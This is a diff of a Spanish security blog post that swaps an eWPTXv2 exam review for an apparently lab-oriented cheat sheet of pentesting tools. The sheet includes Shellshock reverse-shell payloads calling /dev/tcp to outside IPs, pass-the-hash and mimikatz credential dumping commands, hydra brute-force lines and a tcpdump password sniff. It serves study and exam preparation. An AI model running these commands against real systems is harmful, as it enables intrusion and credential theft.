@@ -1,93 +1,635 @@
 ---
 layout: single
-title: Mi experiencia con la certificación eWPTxv2
-excerpt: "Recientemente me he sacado la certificación eWPTxv2, ¿qué tan difícil es?, ¿merece la pena pagar por esta certificación?"
-date: 2020-10-14
+title: Herramientas revisadas (resumen)
+excerpt: "Listado de herramientas útiles en seguridad y unos ejemplos que ayudan a aprender a usarlas"
+date: 2018-02-07
 classes: wide
 header:
   teaser: /assets/images/eWPTxv2/eWPTxv2.png
   teaser_home_page: true
 categories:
-  - Certificaciones
+  - Ethical Hacking
   - Utilidades
 tags:
   - Pentesting
-  - eWPTXv2
   - Web Exploiting
   - Web Penetration Testing
   - Examen
+  - CEH
 ---
 
 <p align="center">
 <img src="/assets/images/eWPTxv2/eWPTxv2.jpeg">
 </p>
 
-## Certificación eWPTxv2
 
-### Mi experiencia personal
+## Preparación para examen 
 
-Ya era hora de redactar este artículo... entre tantas cosas en las que ando metido no he podido sacar un rato para comentaros mi experiencia con esta certificación. Ahora que estoy algo menos ajetreado en esta noche de inspiración... vamos a analizar qué es lo que está pasando aquí. 
+https://ceh.cagy.org/ 
 
-La certificación **eWPTXv2**, ¿merece la pena?, pues mi respuesta es un 'si'. La verdad es que ha sido una certificación desafiante, sobre todo a la hora de hacer el examen, porque me encontré con más cosas de las que me pensaba que habrían y la verdad es que hubo un puro mixto de vulnerabilidades a explotar. 
+ 
 
-Para que tengáis una idea de cosillas que llegué a explotar, pues hubieron desde inyecciones SQL, hasta ataques Blind XXE, ataques de deserialización combinados con vulnerabilidades de tipo SSRF para conseguir RCE, ataques XSS, Object Serialization y otras muchas cosas más. 
+ 
 
-La dinámica del examen es algo distinta a la que tiene por ejemplo Offensive Security, me refiero, en vez de ponerte una serie de objetivos acompañados con un Score para saber en todo momento si llegas a la nota para aprobar o no, esto es más a lo... 'Tú encuentra todo lo que puedas, que ya luego nosotros revisamos el informe final y en base a lo que hayas encontrado decidimos'.
+https://tryhackme.com/games/koth/join/d80d7c8fe47bd9d72eac99ef 
 
-### ¿Qué me pareció el laboratorio?
+ 
 
-Respecto al laboratorio, he de deciros que no puedo comentar nada al respecto, me hubiera gustado probarlo... pero quise aprovechar un cupón que salió en el mes de Septiembre para el Voucher, donde se te quedaba el precio a 300 euros... por lo que decidí ir directo al examen. Ir directo al examen supone que no te entregan documentación ni nada por el estilo, porque estás pagando únicamente para hacer el examen. 
+### 7z2john 
+Necesita compilar esta librería https://www.cpan.org/modules/by-module/Compress/Compress-Raw-Lzma-2.074.tar.gz 
 
-Fue algo arriesgado probar a examinarse sin tener previo material, pero oye... si la jugada salía bien, pues chimpún y pa' dentro, de lo contrario en el peor de los casos pues ya pagaba el curso más adelante y le metía más caña, ¡pero el que no arriesga no gana!.
+ 
 
-### ¿Es difícil la certificación?
+### AirNG 
+Monitorea y sirve para capturar password de routers wifi 
 
-Para aquel o aquella que tenga planteado examinarse de esta certificación, recomiendo de antes tener buenas bases previas sobre pentesting web (ojo, hablo sobre todo si pretendes ir directo al examen). Recomiendo haber teniendo experiencia y manejo al menos sobre los siguientes tipos de vulnerabilidades:
+ 
 
-* Inyecciones SQL (Manuales)
-* Xml External Entity Injections XXE (Incluido Blind XXE)
-* Server-Side Request Forgery (SSRF)
-* Cross-Site Request Forgery (CSRF)
-* Java Deserialization Attacks (Y otros tipos de ataques de deserialización)
-* Template Injections
-* Cross-Site Scripting (XSS)  [Todos los tipos]
-* Authorization Bypass
-* Padding Oracle Attack
-* Local File Inclusion (LFI)
-* Remote File Inclusion (RFI)
-* Type Juggling
+### Armitage 
+versión amistosa/interfaz de Metasploit 
 
-Entre otras muchas más que probablemente me esté dejando en el tintero, pero por lo menos las fundamentales que son con las que más frecuencia trataréis. También recomiendo tener cierto dominio y control sobre los lenguajes Python y PHP, pues en ocasiones os vais a tener que crear vuestras propias utilidades para explotar ciertas vulnerabilidades.
+ 
 
-Con tener dominio de estos lenguajes, me refiero no sólo a nivel de programación, sino también a nivel de entender qué puede estar haciendo un código por detrás... tratando de reversearlo o aprovechar el mismo para computar ciertas cosas (Si doy más pistas es Spoiler, así que preferible dejarlo en el aire xD).
+###Arpspoof 
+suplanta el arp. Sirve para hacer man in the middle 
 
-### ¿Cómo es el examen?
+ 
 
-La idea del examen es la siguiente, te dan un acceso por VPN y te piden que efectúes un análisis de vulnerabilidades sobre un dominio que cuenta con tres subdominios. El análisis de vulnerabilidades comprende no sólo la identificación de las vulnerabilidades, sino también la explotación de las mismas.
+###Burpsuit 
+sirve para interceptar el tráfico web y modificarlo antes de procesarlo. 
 
-Aislado a todo lo que encuentres, sí que es cierto que hay una serie de requisitos que tienes que cumplir para lograr aprobar el examen, aunque lo indican como "Los requisitos necesarios pero no suficientes para aprobar...". 
+  Detener una petición de get y modificar el user agent (ShellShock) 
 
-Estos son:
+User-Agent:() { :; }; /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.23/80850 0>&1' 
 
-* Leer cierto archivo alojado en una ruta interna del sistema.
-* Conseguir ejecución remota de comandos mediante la explotación de dos servicios que corren en la máquina, accesibles desde el servidor web.
+ 
 
-Si consigues estos objetivos y encima encuentras un buen puñado de vulnerabilidades extra, yo diría que ya te puedes quedar tranquilo/a. Recordad que no hay puntuación, no hay una nota en si que podáis calcular para saber más o menos el Score que podáis estar sacando, la idea es más bien encontrar todo lo que puedas.
+### CACTUSTORCH 
+FrameWork que permite la generación de archivos word capaces de devolver session reversa de tipo meterpreter. 
 
-Bajo mi experiencia, he de decir que llegué a explotar algunas vulnerabilidades que me parecieron flipantes, en el sentido de que igual me esperaba que las vulnerabilidades a explotar iban a ser algo más sencillas, pero en absoluto... hay alguna que otra que te puede hacer perder bastante tiempo, sobre todo una que llevaré siempre conmigo en el corazón con la que estuve casi un día entero para sacarla (mucha metodología de prueba/error).
+ 
 
-### ¿Cuánto dura el examen?
+### Cadaver 
+para conectarse a servicios webdav 
 
-El examen dura un total de siete días. En mi caso necesité cuatro días para encontrar todas las vulnerabilidades que pude y un día para generar el informe final. Efectivamente chavales, lo que tanto nos gusta a todos, una vez finalizas es necesario detallar todo lo encontrado a través de un reporte técnico y ejecutivo, incorporando las capturas de pantalla necesarias y las pruebas de concepto de todo lo que hayas hecho.
+'''$cadaver http://<ip>/webdav 
 
-Aislado al examen, la fase de documentación son otros siete días aparte, pero bueno en ese aspecto fui bastante rápido porque ya había estado previamente trabajando en una plantilla hecha en LaTeX para ir a tiro hecho (igual que en el OSCP), así que la documentación fue lo que menos me llevó. En conclusión, contando con los días para la examinación y la creación del reporte final, el examen son unos catorce días, pero una vez finalizados los siete primeros días del examen, te cortan la conexión por VPN.
+login to the XAMPP server's WebDAV folder  
 
-### ¿Qué toca ahora?
+cadaver http://<REMOTE HOST>/webdav/ 
 
-He estado pensando en hacer el AWAE (OSWE) de Offensive Security, así en caso de sacarla os puedo comentar diferencias con respecto a la certificación eWPTXv2, porque por el momento no puedo hacer distinción.
+user: wampp 
 
-Como siempre, en paralelo seguiré subiendo vídeos al canal de YouTube y generando todo el contenido que pueda para vosotros.
+pass: xampp  
 
-¡A cuidarse!
+upload a file to the webdav folder  
 
+put /tmp/helloworld.txt  
+
+browse to your uploaded file  
+
+load URL, http://<REMOTE HOST>/webdav/helloworld.txt, in browser '''
+
+Desde <http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html>  
+
+
+### Cewl 
+(Accent Keyword Extractor) extrae las palabras de una página web y genera un diccionario 
+
+'''cewl <url> -d 0 -m 6 -w <nombre.dic> '''
+
+ 
+
+### ShellShock con curl 
+
+curl -H "User-Agent: () { :;}; echo; <comando>" http://hello.com/cgi-bin/<cualquier ejecutable que se encuentre aquí> 
+
+Ejemplo: /bin/bash -c "bash -i >& /dev/tcp/10.10.14.74/443 0>& 
+
+### CertUtil 
+https://www.hackingarticles.in/windows-for-pentester-certutil/ 
+
+### CUPP 
+crea diccionario en función de un cuestionario para perfilar. (git clone https://github.com/Mebus/cupp.git) 
+
+### CURL 
+ver detalle 
+
+### Crunch 
+Crea password para hacer diccionarios 
+
+'''crunch 8 8 -t telsur%% | aircrack-ng -w - test-01.cap -e something 
+
+crunch 8 8 0123456789 | pyrit -r msc-01.cap -i - attack_passthrough 
+
+crunch 6 7 eghotu0134 | perl -ne 'print unless /([a-z]).*\1/' > wordlist.txt 
+
+crunch 8 8 987 -t @%%%%%%% -p +569 -o numeros.txt  (genera números de celulares chilenos) '''
+
+### Dig 
+Obtiene información de dns (puerto 53) para un dominio particular 
+
+'''dig windcorp.thm any @10.10.78.247 '''
+
+ 
+
+### Dirb 
+enumera urls disponibles de un dominio, por medio de probar las carpetas más comunes. 
+
+'''dirb http://<sitio>/<path>;  dirb http://192.168.1.103 -X .php '''
+
+ 
+
+### dmitry
+para obtención de información 
+
+'''dmitry -s -n <host> '''
+
+ 
+### DNSenum 
+Enumera información de los servidores DNS 
+
+### DNSMap
+Obtiene información de los DNS 
+
+### Dnsmasq
+ 
+
+### Empire
+Agente de post-explotación de PowerShell puro basado en comunicaciones criptográficas seguras y una arquitectura flexible. 
+
+ 
+
+### Enum4linux 
+https://highon.coffee/blog/enum4linux-cheat-sheet/ 
+
+### Ettercap 
+para arpoisoning / MITM1 
+
+
+### Exiftool 
+extrae y modifica metadatos 
+
+### Evil-winrm  
+explota pass the hash 
+'''Sudo gem install evil-winrm 
+
+evil-winrm -i 10.10.136.125 -H e4876a80a723612986d7609aa5ebc12b --user Administrator '''
+
+Crea una shell directamente en el equipo windows. 
+
+https://blog.spookysec.net/kerberos-abuse/ 
+
+
+### fcrackzip 
+para usar fuerza bruta en zips. 
+'''fcrackzip -v -D -u -p /usr/share/dict/words secret.zip '''
+ 
+### Forfiles (windows) 
+
+'''C:\>forfiles /P C: /S /M "*curso*" -> busca en el disco todos los archivos que contengan en el nombre curso '''
+
+### Fluxion 
+crackear wifi 
+
+### file
+muestra características del archivo a modo de identificar su tipo. (magic number) 
+
+ 
+
+### Find
+Para encontrar archivos o cadenas de texto. 
+
+'''find / -perm -u=s -type f 2>/dev/null        sirve para encontrar ejecutables que se pueden correr como root 
+
+find / -perm -4000 2>/dev/null               lo mismo. 
+
+Find /home -type -f -printf "%f\t%p\t%p\t%u\r%g\t%m\n" | column -t     para listar todos los archivos de un directorio y sus atributos. 
+
+find . -iname '*config*' -type f -exec grep -nie 'pass.*=' --color=always /dev/null {} \;  -->para encontrar contraseñas en archivos de configuración 
+
+find . -exec grep foo {} + will show you output like this ./dir/file.py:from foo import bar  
+
+find . -exec grep foo {} \; will show you output like this from foo import bar  
+
+find . -exec grep -l foo {} + will show you output like this ./dir/file.py  
+
+find . -exec grep -l foo {} \; will show you output like this ./dir/file.py  '''
+
+Desde <https://unix.stackexchange.com/questions/12902/how-to-run-find-exec>  
+
+ 
+### FTP 
+Para conectarse al puerto 21. En caso de no querer responder al ls, probar poniendo PASS, para pasar al modo passivo 
+
+### Gpg
+Encripta y desencripta PGP  (no es necesario usar openssl) 
+
+En caso de encontrar *.pgp y private.asc 
+
+'''gpg --import private.asc'''
+para agregar la llave a la base de datos local. (necesitarás crackear el pass con pgp2john y " hash" 
+
+'''gpg --decrypt algo.pgp'''
+y poner la contraseña crackeada 
+http://irtfweb.ifa.hawaii.edu/~lockhart/gpg/ 
+
+### Gobuster 
+
+'''gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://jeff.thm/ -t 20     --> para fuzzear virtualhosts 
+
+gobuster dns -d http://mydomain.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt '''
+
+### grep 
+revisa el contenido de los archivos 
+
+'''grep '\=$' -> sirve para encontrar base64 dentro de archivos en CTFs 
+
+grep -E '(192.168.0.30|192.168.0.40)' -> busca ambas ip simultaneamente 
+
+grep -w -i "^r....$" /usr/share/wordlists/rockyou.txt ->palabras de 5 letras que comiencen con r 
+
+grep -oP '".*?"'  ->muestra el contenido de las comillas dobles 
+
+grep -io "[0-9]\{1,2\}"  busca números de uno o dos dígitos que contengan del 0 al 9. 
+
+grep 'c:\\users\\' para evitar el backslash trailing. Es necesario usar comilla simple y doble backslash. '''
+
+### Flags 
+
+-R Does a recursive grep search for the files inside the folders(if found in the specified path for pattern search; else grep won't traverse diretory for searching the pattern you specify) 
+
+-h If you're grepping recursively in a directory, this flag disables the prefixing of filenames in the results. 
+
+-c This flag won't list you the pattern only list an integer value, that how many times the pattern was found in the file/folder. 
+
+-i I prefer to use this flag most of the time, this is what specifies grep to search for the PATTERN while IGNORING the case  
+
+-l will only list the filename instead of pattern found in it. 
+
+-n It will list the lines with their line number in the file containing the pattern. 
+
+-v This flag prints all the lines that are NOT containing the pattern 
+
+-E This flag we already read above... will consider the PATTERN as a regular expression to find the matching strings.  
+
+-e The official documentation says, it can be used to specify multiple patterns and if any string matches with the pattern(s) it will list it. 
+Desde <https://tryhackme.com/room/linuxmodules>  
+
+ 
+
+ 
+
+### Harness
+FrameWork para creacion de payload. 
+
+### Hash-identifier 
+Para identificar qué cifrado tiene un texto 
+
+### Hydra, xhydra 
+Logueador por fuerza bruta web. 
+
+'''hydra -L <name.txt> -P <pass.txt> <ip> http-post-form “/wp-login.php:log=^USER^&pwd=^PASS^:F=ERROR”   
+
+hydra -l admin -P /pass.txt <ip> -s 8081 http-post-form "/info/login.html:admin_Username=^USER^&admin_Password=^PASS^:submit=logIn_btn" -V -t 1 '''
+
+o 
+'''hydra -l admin -P <passwordlist> -e ns -V <targetip> http-get /  
+hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 ssh://192.168.1.123 
+Hydra -e nsr <ip> pop3 -l <user> -P <rockyou.txt> -s <port> -V 
+hydra -l username -P password_file.txt -s port -f ip_address request_method /path '''
+(para htaccess) 
+
+
+ 
+### john 
+crackea password 
+
+'''john --wordlist=rockyou.txt <passfile> --pot=<dondequieroquedejelosresultados> '''
+'''john file.hash'''
+(para crackear el hash de un zip hecho con zip2john) se puede usar el parámetro --incremental para fuerza bruta. 
+
+ 
+
+### Macchanger 
+Cambia la mac address 
+
+
+### Macof 
+Para hacer MAC flooding. (en este estado el switch pasa a hacer broadcast (sale de unicast) y con wireshark se puede interceptar el contenido de la comunicación. 
+
+'''macof -i <interface> -n <cantidad de veces> '''
+
+
+ 
+
+### Maltego 
+Permite, a través de un dato cualquiera (cuenta de usuario, dominio, mail, etc.) encontrar información relacionada con este disponible en la web (como redes sociales, subdominios, libretas de direcciones, etc.). 
+
+### Medusa 
+Para crackear páginas con .htaccess.  
+
+'''medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test.php - '''
+
+
+### Metasploit 
+Para explotar vulnerabilidades y escanear 
+
+
+### Mimikatz 
+Mimikatz junto con Windows Credential Editor son capaces de leer de la memoria para obtener las claves en texto plano. 
+
+'''mimikatz.exe privilege::debug sekurlsa::logonPasswords full exit'''
+(debe ser ejecutado en una ventana con permisos de administrador) 
+
+ 
+### NC o NetCat 
+Conector de ssh. Sirve para hacer listeners o  conexiones a puertos específicos (ver mas detalles abajo) 
+
+ 
+### Netdiscover 
+Encuentra equipos prendidos en la red.. (si no se le pone parámetros, busca en todos) 
+
+ 
+### Nikto 
+Audita servidor en búsqueda de vulnerabilidades conocidas. 
+
+'''nikto -h <IP> '''
+
+ 
+### Nmap 
+Escaneador por excelencia. (ver detalles) 
+
+
+### nslookup  
+Para realizar osint a servers de correo 
+
+'''$nslookup 
+
+>set q=txt 
+
+><domain>             | para ver SPF 
+
+>selector.<domain>    | para ver DKIMz 
+
+>_dmarc.<domain>      | para ver dmarc 
+
+>exit '''
+
+### Leafpad 
+Notepad en interfaz gráfica de kali 
+
+
+### Ophcrack 
+crackea contraseñas con rainbow table 
+
+'''sudo ophcrack-cli -d /mnt/c/z/ophcrack_xp_tables -t xp_special -f hash -o dump -u '''
+ 
+### Perl 
+Ejecuta código pl 
+
+'''perl -ne 'print unless /([a-z]).*\1/' dict.txt > outfile.txt '''
+sirve para extraer de un diccionario las palabras que no repiten caracteres 
+
+### pth-winexe 
+Pass the Hash sirve para ejecutar comandos desde un linux sobre un equipo windows comprometido 
+
+'''pth-winexe -U WorkGROUP/Administrator%<hashntlm> //<ipvictima> <comandodeseado>'''
+(puede ser cmd.exe) 
+
+Es necesario repertir el último hash. Ejemplo 
+
+'''E_md4hash wrapper called. 
+HASH PASS: Subst user supplied NTLM HASH. 
+Microsoft Windows [Verstn 19.0. 14393] 
+(c) 2016 Microsott Corporation. Todos Los derechos reservados. 
+whoami 
+s4vicorp\administrador pth-wtnexe -U s4vtcorp/Admtntstrador020ae267eY4d417tcteoet4gecbd4b33:92eae267e048417tcteeot49ecbd4b33 //192.168. let. 133 cmd '''
+ 
+
+
+### Python 
+Para ejecutar .py 
+
+''' python -c 'import pty; pty.spawn("/bin/sh")' '''
+ sirve para cargar consola una vez conectado por nc a un servidor. 
+
+'''  CTRL +Z 
+
+  stty raw -echo 
+
+fg enter enter '''
+
+'''python -m SimpleHTTPServer 80 '''
+'''python3 -m http.server 8080 '''
+sirve para levantar un servicio web simple con file dir. 
+
+ 
+
+### Proxychains 
+herramienta de shell que permite, en base a un archivo de configuración con listas de servidores proxy, realizar otras operaciones de red a través de estos equipos, saltando por varios de ellos, no exponiendo al equipo local ni dejando registro directo en él o los equipos objetivo 
+
+ 
+
+### psexec.py 
+sirve para levantar shell en windows desde linux, sabiendo la contraseña. 
+
+'''psexec.py clk:clk123@10.10.10.1 cmd.exe 
+
+Psexec.py -hashes :<ntlm/hash> <user>@<host>   --->pass the hash del ntlm '''
+
+ 
+
+### rpl 
+Comando que permite reemplazar una cadena de texto por otra en un archivo 
+'''rpl <original> <reemplazo> <archivo.txt>'''
+
+### Rabin2 
+'''rabin2 –zzz'''
+Además de revisar binarios, este comando puede mostrar los strings mejor que STRINGS 
+
+### Searchsploit 
+Busca en la base de datos de ExploitDB pero descargada en Kali 
+
+ 
+### SETH 
+Herramienta de Ingeniería social. Además sirve para hacer Mitm particularmente a RDP 
+
+### smbclient 
+ver detalles 
+
+### Smbget  
+
+''' smbget –R smb://10.10.10.172/user$ -U 'user' '''
+
+### smbmap 
+sirve para revisar carpetas compartidas en puerto 445. 
+
+'''smbmap -u jpalma -p <pass> -d cnt -H mateo.cnt.telsur.cl -r <path_optional> 
+
+smbmap -H 10.10.10.100 -A Groups.xml -R Replication -q 
+
+lee el archivo groups.xml que estaba en SYSVOL /policies/{2mdsdsd}/MACHINE/Groups/ 
+
+smbmap -H <ip> -r share  -->conecta al smb 
+
+smbmap -H <ip> --upload <algo> <dirdest/algo> 
+
+smbmap –H 8.8.8.8 -u 'null' '''
+
+
+### smbserver.py 
+'''smbserver.py <nombredelrecurso> <directorioacompartir> '''
+
+
+### ss (socket statistics) 
+https://neverendingsecurity.wordpress.com/2015/04/13/ss-socket-statistics-commands-cheatsheet/ 
+
+ 
+### ssh 
+-o StrictHostKeyChecking=no   --->evita que pida confirmaciòn 
+Portforward 
+'''ssh -L 80:172.0.0.1:80 root@victima '''
+
+### Steghide
+programa de esteganografía 
+
+'''steghide embed -ef sample.txt -cf image.jpg -sf output.jpg 
+
+steghide extract -sf image.jpg -p <pass> '''
+
+
+### Stegsnow 
+
+'''stegsnow –m secreto infile outfile 
+stegsnow –C outfile '''
+
+ 
+### Shodan
+herramienta que indexa en la Internet todos los equipos conectados IoT, con la descripción del tipo de equipo, servicios expuestos, versiones y demás características relevantes 
+https://www.shodan.io
+
+### Shodanwave 
+Permite buscar cámaras ip vía shodan y crackear sus password. 
+
+ 
+### Socat 
+para pivotear en otra red (o para hacer port forwarding) 
+
+'''cd /tmp 
+wget http://10.10.14.6/socat (hay que levantar un servicio web para ofrecerlo) 
+chmod +x socat 
+./socat tcp-listen:<ipquequierousar>,reuseaddr,fork tcp:<ip>:<ipreal> '''
+
+### tcpdump
+sniffer de tráfico local de red
+'''tcpdump -i tun0 icmp 
+tcpdump port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-buffered -B20 '''
+
+### TheHarvester 
+Recopila información (ejecutar en modo sudo, dado que es necesario escribir datos en disco) 
+
+### The LAZY script
+FrameWork de tareas automatizadas en base a script, muy completo. 
+
+### tplmap 
+Descubre vulnerabilidades de LFI de java (https://github.com/epinna/tplmap) 
+
+### tshark 
+línea de comando de wireshark. Puede mostrar estadísticas de un .pcap 
+
+'''tshark -nnr imadecoy -qz  io,phs (estadísticas de jerarquía) 
+tshark -nnr imadecoy -qz ip_hosts,tree (estadísticas de tráfico) '''
+
+#### Metodología de revisión tshark
+'''$tshark -r <captured.cap>         --->analiza tráfico 
+
+$tshark -r <captured.cap> -Tjson  --->muestra todos los campos 
+
+$tshark -r <captured.cap> -Tfields -e <campo> --->filtra sólo por un campo ejemplo data.data 
+
+$tshark -r <captured.cap> -Tfields -e <campo> -Y "<protocolo>" | xxd -r -p  ---> traduce el contenido de hex a textoplano '''
+ 
+### ViMdecript  
+https://raw.githubusercontent.com/nlitsme/vimdecrypt/publicbranch/vimdecrypt.py 
+
+ 
+### wget 
+Para descargar webpages.. Puede ser la página principal o el sitio completo. 
+'''wget -r <url>'''
+descarga recursiva
+'''wget --no-check-certificate https://140.211.11.121/ '''
+para descargar páginas donde el certificado está malo. 
+
+ 
+### Wfuzz 
+para recorrer(fuzzear) urls con parámetros definidos. 
+
+para fuzzear web 
+
+'''wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.69/sync?FUZZ=ls -c --hh 19 '''
+para fuzzear login 
+'''wfuzz -c -L -t 500 --hh=27136 -w wordlist.txt -d 'username=Giovanni@password=FUZZ' http://10.10.10.153/moodle/login/index.php '''
+-c 
+-L follow redirect 
+-t threads 
+--hh hide characters 
+-w wordlist 
+-d data en post 
+
+Para fuzear subdominios 
+
+'''wfuzz -w /directory.txt -H "host: FUZZ.host.com" --hc 200 --hw 356 -t 100 <ip> '''
+(si encuentras, para luego verlos, hay que agregarlos al archivo /etc/hosts )  
+
+### WinRM 
+https://www.hackingarticles.in/winrm-penetration-testing/ 
+
+ 
+### wmic
+ejecuta ordenes al sistema windows. (para windows) 
+
+'''wmic volume get driveletter, label | findstr "CLK" '''
+identifica en qué unidad está la USB 
+
+'''for /f %d in ('wmic volume get driveletter^, label ^| findstr "CLK"') do set duck=%d '''
+
+### wireshark 
+sniffer de red 
+ 
+### vp 
+escaneador de servidores wordpress 
+
+
+### wpscan 
+Escaneador de vulnerabilidades de wordpress y logueador de fuerza bruta o diccionario
+'''wpscan --url <ip/path> --enumerate vp
+wpscan --url www.test.local --wordlist pwd_dict.txt --username admin '''
+https://www.hackingarticles.in/wpscanwordpress-pentesting-framework/ 
+
+
+### wapiti
+Analisis de vulnerabilidades web (http://wapiti.sourceforge.net/) 
+
+### Xfreerdp
+
+'''xfreerdp /u:fela /d:corp /p:"rubenF124" /v:10.10.164.123 /cert-ignore /f '''
+/f fullscreen. Se desconecta con ctrl+alt+enter 
+
+### xsltproc 
+transforma un export de nmap en un reporte amistoso 
+'''xsltproc archivo.xml >archivo.html '''
+
+### xxd 
+muestra el contenido hexadecimal del un archivo 
+
+'''xxd -r '''
+reversa desde un hexadecimal a binario
+
+### yersinia 
+FrameWork para ataques a la capa 2, genera starvation del dhcp 
+
+### Zip2john 
+'''zip2john test.zip > zip.hashes '''
+genera hash de un zip para luego crackearlo con john
 
